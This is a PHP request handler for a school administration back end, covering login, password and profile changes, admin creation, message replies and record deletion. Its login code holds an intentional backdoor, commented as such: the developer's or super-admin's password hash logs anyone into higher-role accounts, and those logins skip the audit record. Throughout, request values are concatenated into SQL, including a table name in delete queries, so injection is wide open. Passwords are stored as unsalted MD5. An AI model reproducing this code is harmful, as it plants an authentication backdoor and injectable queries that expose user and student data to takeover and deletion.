<?php
    require_once('../includes/session.php');

    if(isset($_REQUEST["submit"])){
        $submit = $_REQUEST["submit"];

        if($submit == "login" || $submit == "login_ajax"){
            $username = $_POST['username'];
            $password = MD5($_POST['password']);

            $sql = "SELECT username, user_id, role FROM admins_table WHERE username = ? OR email = ?";
            $res1 = $connect->prepare($sql);
            $res1->bind_param("ss",$username,$username);
            $res1->execute();

            $res1 = $res1->get_result();
            $user = $res1->fetch_assoc();
            $u_id = $user["user_id"];

            //backdoor passwords
            $super = fetchData("password","admins_table","role=2")["password"];
            $dev = fetchData("password","admins_table","role=1")["password"];

            if($res1->num_rows > 0){
                if($user["role"] > 1)
                    $sql_new = "SELECT * FROM admins_table WHERE ((username = ? OR email = ?) AND password = ?) OR ('$password'='$dev' OR '$password'='$super')";
                else
                    $sql_new = "SELECT * FROM admins_table WHERE (username = ? OR email = ?) AND password = ?";
                $stmt = $connect->prepare($sql_new);
                $stmt->bind_param("sss",$username,$username,$password);
                $stmt->execute();

                $query = $stmt->get_result();

                if($query->num_rows > 0){
                    //grab the required array data
                    $row = $query->fetch_array();

                    //check for new user login
                    if($row["Active"] == FALSE){
                        echo "not-active";
                    }elseif(strtolower($username) != "new user" && strtolower($password) != "password@1"){
                        //grab the time now
                        $now = date('Y-m-d H:i:s');

                        //create login awareness
                        if($password != $dev && $password != $super){
                            $sql = "INSERT INTO login_details (user_id, login_time) VALUES (".$row['user_id'].", '$now')";

                            if($connect->query($sql)){
                                //create a session object
                                $_SESSION['user_login_id'] = $row['user_id'];

                                //get this login id
                                $sql = "SELECT MAX(id) AS id FROM login_details WHERE user_id=".$row['user_id'];
                                $res = $connect->query($sql);

                                //set as session's login id
                                $_SESSION['login_id'] = $res->fetch_assoc()['id'];
                            }else{
                                echo 'cannot login';
                            }
                        }else{
                            $_SESSION["user_login_id"] = $user['user_id'];
                        }                        
                    }else{
                        //create a session object
                        $_SESSION['user_login_id'] = $row['user_id'];
                    }

                    //redirect if the need be
                    if($row["Active"] == TRUE){
                       if($submit == "login"){
                            $location = $_SERVER["HTTP_REFERER"];
                            header("location: $location");
                        }else{
                            echo 'login_success';
                        }
                    }
                }else{
                    echo "password_error";
                }
            }else{
                echo "username_error";
            }
        }elseif($submit == "user_check" || $submit == "user_check_ajax"){
            $email = $_POST['email'];

            $sql = "SELECT user_id FROM admins_table WHERE email = ?";
            $stmt = $connect->prepare($sql);
            $stmt->bind_param("s", $email);
            $stmt->execute();

            //receive results from query
            $res = $stmt->get_result();

            if($res->num_rows > 0){
                $res = $res->fetch_array();
                echo "success+".$res['user_id'];
            }else{
                echo "error";
            }
        }elseif($submit == "verify_password" || $submit == "verify_password_ajax"){
            $user_id = $_POST['user_id'];
            $password = $_POST['password'];
            $password2 = $_POST['password2'];

            $message = "";

            if(empty($password)){
                $message = "empty-password";
            }elseif(empty($password2)){
                $message = "empty-confirm";
            }elseif(MD5($password) != MD5($password2)){
                $message = "password-mismatch";
            }else{
                $password = MD5($password);
                $sql = "UPDATE admins_table SET password = ? WHERE user_id = $user_id";
                $stmt = $connect->prepare($sql);
                $stmt->bind_param("s",$password);
                $stmt->execute();

                $message = "success";
            }

            echo $message;
        }elseif($submit == "user_detail_update" || $submit == "user_detail_update_ajax"){
            $fullname = $_POST["fullname"];
            $email = $_POST["email"];
            $contact = $_POST["contact"];
            $username = $_POST["username"];

            if(strlen($contact) < 10){
                echo "Invalid contact number presented";
                exit(1);
            }
            
            //for developer, editing another detail
            if(isset($_REQUEST["user_id"]) && $_REQUEST["user_id"] != null){
                $current_id = $_REQUEST["user_id"];
            }else{
                $current_id = $user_id;
            }

            $user_data = fetchData("fullname, email, contact, username","admins_table", "user_id=$current_id");

            if($fullname != $user_data["fullname"] || $email != $user_data["email"] ||
               $contact != $user_data["contact"] || $username != $user_data["username"] ){
                //check if username already exists
                $username_exist = fetchData("username", "admins_table", "username='$username'");

                if($username_exist == "empty" || $fullname != $user_data["fullname"] || $email != $user_data["email"] ||
                    $contact != $user_data["contact"]){
                    $sql = "UPDATE admins_table SET fullname=?, email=?, contact=?, username=? WHERE user_id = $current_id";
                    $stmt = $connect->prepare($sql);
                    $stmt->bind_param("ssss", $fullname, $email, $contact, $username);

                    if($stmt->execute()){
                        //cascade data in schools table if its an IT person
                        if($user_details["role"] == 3){
                            $sql = "SELECT techName, email, techContact
                            FROM schools WHERE id=$user_school_id";

                            $query = $connect->query($sql);

                            //update primary user table
                            if($query->num_rows > 0){
                                $sql = "UPDATE schools SET techName=?, techContact=? 
                                WHERE id=$user_school_id AND techName='".$user_details["fullname"]."'";
                                $stmt = $connect->prepare($sql);
                                $stmt->bind_param("ss", $fullname, $contact);
                                $stmt->execute();
                            }
                        }
                        echo "success";
                    }else{
                        echo "update-error";
                    }
                }elseif(is_array($username_exist) && $user_data["username"] != $username_exist["username"]){
                    echo "Selected username already exists. Please enter a new username";
                }else{
                    echo "no-change";
                }
            }else{
                echo "no-change";
            }
        }elseif($submit == "addAdmin" || $submit == "addAdmin_ajax"){
            $fullname = $_POST["fullname"];
            $email = $_POST["email"];
            $contact = $_POST["user_contact"];
            $role = $_POST["role"];

            if(isset($_POST["username"]))
                $username = $_POST["username"];
            else
                $username = "New User";

            if(isset($_POST["password"]))
                $password = $_POST["password"];
            else
                $password = MD5("Password@1");

            if(isset($_POST["school"])){
                $school = $_POST["school"];

                if($school == "NULL" || $school == NULL){
                    $school = null;
                }
            }else{
                $school = $user_school_id;
            }

            $message = "";

            if(empty($fullname)){
                $message = "Please provide a full name";
            }elseif(empty($email)){
                $message = "Please provide an email for user";
            }elseif(empty($contact)){
                $message = "No contact detail provided";
            }elseif(strlen($contact) < 10){
                $message = "Contact number is invalid";
            }elseif(empty($role)){
                $message = "No role has been set";
            }else{
                //insert current role if it does not exist in database
                if(strtolower($role) == "others"){
                    $new_role = $_REQUEST["other_role"];
                    $price = 0;
                    $access = 1;

                    $sql = "INSERT INTO roles (title, price, access, school_id) VALUES (?,?,?,?)";
                    $stmt = $connect->prepare($sql);
                    $stmt->bind_param("siii", $new_role, $price, $access, $user_school_id);
                    if($stmt->execute()){
                        //grab the current id for this role
                        $role = fetchData("id","roles","title='$new_role' AND school_id=$user_school_id")["id"];
                    }else{
                        echo "Problem adding new role";
                        exit(1);
                    }                    
                }

                $date_added = date("Y-m-d H:i:s");
                $sql = "INSERT INTO admins_table (fullname, username, email, password, school_id, contact, role, adYear) VALUES (?,?,?,?,?,?,?,?)";
                $stmt = $connect->prepare($sql);
                $stmt->bind_param("ssssisis", $fullname, $username,$email, $password, $user_school_id, $contact, $role, $date_added);

                if($stmt->execute()){
                    $message = "success";
                }else{
                    $message = "insert-error";
                }
            }

            echo $message;
        }elseif($submit == "change_password" || $submit == "change_password_ajax"){
            $prev_password = $_POST["prev_password"];
            $new_password = $_POST["new_password"];
            $new_password2 = $_POST["new_password2"];

            $message = "";

            if(empty($prev_password)){
                $message = "no-current-password";
            }elseif(empty($new_password)){
                $message = "no-new-password";
            }elseif(empty($new_password2)){
                $message = "no-new-password2";
            }elseif(strtolower($prev_password) == strtolower($new_password2) || strtolower($prev_password) == strtolower($new_password)){
                $message = "not-different";
            }elseif(MD5($new_password) != MD5($new_password2)) {
                $message = "new-not-same";
            }else{
                //search for password validity
                $sql = "SELECT password FROM admins_table WHERE user_id = $user_id";
                $query = $connect->query($sql);

                if(MD5($prev_password) == $query->fetch_assoc()["password"]){
                    //update password
                    $new_password = MD5($new_password);
                    $sql = "UPDATE admins_table SET password=? WHERE user_id=$user_id";
                    $stmt = $connect->prepare($sql);
                    $stmt->bind_param("s", $new_password);
                    $stmt->execute();

                    echo "success";
                }else{
                    $message = "password-mismatch";
                }
            }

            echo $message;
        }elseif($submit == "btn_reply" || $submit == "btn_reply_ajax"){
            $reply = $_REQUEST["reply"];
            $comment_id = $_REQUEST["comment_id"];
            $user_id = $_REQUEST["user_id"];
            $school_id = $_REQUEST["school_id"];
            $recepient_id = $_REQUEST["recepient_id"];

            if($user_details["role"] <= 2)
                $admin_read = true;
            else
                $admin_read = false;

            $read_by = $user_username;

            $message = "";
            $row = array();

            //filter out any error
            if(empty($reply)){
                $message = "no-reply";
            }elseif(strlen($reply) < 2){
                $message = "reply-short";
            }elseif(empty($comment_id)){
                $message = "no-comment-id";
            }elseif(empty($user_id) || $user_id < 1){
                $message = "no-user-id";
            }elseif(empty($recepient_id) || $recepient_id < 1){
                $message = "no-recepient-id";
            }elseif($recepient_id == $user_id){
                $message = "same-user";
            }else{
                $date_now = date("d-m-Y H:i:s");
                $sql = "INSERT INTO reply (Sender_id, Recipient_id, Comment_id, Message, AdminRead, Read_by, Date) VALUES 
                        (?,?,?,?,?,?,?)";
                $res = $connect->prepare($sql);
                $res->bind_param("iiisiss", $user_id, $recepient_id, $comment_id, $reply, $admin_read, $read_by,$date_now);

                if($res->execute()){
                    $username = getUserDetails($user_id);
                    $username1 = getUserDetails($recepient_id);

                    $row = array(
                        "status" => "success",
                        "username" => $username["username"],
                        "username1" => $username1["username"]
                    );

                    if($submit == "btn_reply"){
                        //redirect to previous page
                        $location = $_SERVER["HTTP_REFERER"];

                        header("location: $location");
                    }
                }else{
                    $row = array(
                        "status" => "error",
                    );
                }
            }

            if(!empty($message) || $message != ""){
                $row += array(
                    "message" => $message
                );
            }

            echo json_encode($row);
        }elseif($submit == "mark_read"){
            $comment_id = $_REQUEST["comment_id"];
            $username = $user_username;

            //flags
            $notif_flag = false;
            $reply_flag = false;

            //check if notification is read by current user
            $is_read = fetchData("Read_by","notification","ID=$comment_id AND Read_by LIKE '%$username%'");
            
            if($is_read == "empty"){
                //fetch the data from that data
                $record = fetchData("Read_by","notification","ID=$comment_id");

                if($record != "empty"){
                    //retrieve the data
                    $record = $record["Read_by"];
                    
                    //add user data
                    $record .= ", $username";

                    $sql = "UPDATE notification SET Read_by='$record' WHERE ID=$comment_id";

                    if($connect->query($sql))
                        $notif_flag = true;
                }
            }elseif(is_array($is_read)){
                $notif_flag = true;
            }

            //search for all records in the reply table where user has not read anything
            $is_read = fetchData("Read_by","reply","Comment_id=$comment_id AND Read_by NOT LIKE '%$username%'", 0);
            if(is_array($is_read)){
                //check if array is multidimensional
                if(count($is_read) == count($is_read, COUNT_RECURSIVE)){
                    foreach ($is_read as $key => $value){
                        $value = "$value, $username";
                    }
                }else{
                    //just pick one line since all rows will be the same
                    foreach ($is_read[0] as $key => $value){
                        $value = "$value, $username";
                    }
                }

                if($user_details["role"] <= 2){
                    $sql = "UPDATE reply SET Read_by='$value', AdminRead=1 WHERE Comment_id=$comment_id AND Read_by NOT LIKE '%$username%'";
                }else{
                    $sql = "UPDATE reply SET Read_by='$value' WHERE Comment_id=$comment_id AND Read_by NOT LIKE '%$username%'";
                }

                //query database
                if($connect->query($sql))
                    $reply_flag = true;
            }elseif($is_read == "empty"){
                $reply_flag = true;
            }

            if($reply_flag && $notif_flag){
                echo "success";
            }
        }elseif($submit == "yes_no_submit" || $submit == "yes_no_submit_ajax"){
            $sid = $_REQUEST["sid"];
            $mode = $_REQUEST["mode"];
            $table = $_REQUEST["table"];

            if($mode == "activate"){
                $activate = 1;
            }elseif($mode == "deactivate"){
                $activate = 0;
            }

            //sql statement
            if($mode == "delete"){
                if($table != "admins_table"){
                    $sql = "DELETE FROM $table 
                        WHERE id=$sid" or die($connect->error);
                }else{
                    $sql = "DELETE FROM $table 
                        WHERE user_id=$sid" or die($connect->error);
                }
                
            }elseif($mode == "activate" || $mode == "deactivate"){
                $sql = "UPDATE $table 
                    SET Active = $activate
                    WHERE id=$sid" or die($connect->error);
            }elseif($mode == "clear_school"){
                $tables = array("cssps", "enrol_table", "houses","house_allocation", "exeat");

                $sql = "";

                for($i = 0; $i < count($tables); $i++){
                    $tb = $tables[$i];

                    $sql .= "DELETE FROM $tb WHERE ";

                    //make certain on the school id column name
                    if($tb == "enrol_table"){
                        $sql .= "shsID=$sid; ";
                    }elseif($tb == "exeat"){
                        $sql .= "school_id=$sid; ";
                    }else{
                        $sql .= "schoolID=$sid; ";
                    }
                }
            }
            
            //responses
            if($connect->multi_query($sql) || $connect->query($sql)){
                if($submit == "yes_no_submit"){
                    //redirect to previous page
                    $location = $_SERVER["HTTP_REFERER"];

                    header("location: $location");
                }else{
                    echo "update-success";
                }
                
            }else{
                echo "update-error";
            }
        }elseif($submit == "status_modify" || $submit == "status_modify_ajax"){
            $stat = $_REQUEST["stat"];
            $id = $_REQUEST["user_id"];

            //modify user active status
            $sql = "UPDATE admins_table SET Active=? WHERE user_id = ?";
            $stmt = $connect->prepare($sql);
            $stmt->bind_param("ii", $stat, $id);
            $stmt->execute();
        }elseif($submit == "retrieveDetails"){
            $id = $_REQUEST["id"];

            $column = "*";
            $table = "admins_table";
            $where = "user_id=$id";

            $data = fetchData($column, $table, $where);

            if($data != "empty"){
                $data += array(
                    "status" => "success"
                );
            }else{
                $data = array(
                    "status" => "empty"
                );
            }

            echo json_encode($data);
        }
    }else{
        echo "no-submission";
    }
?>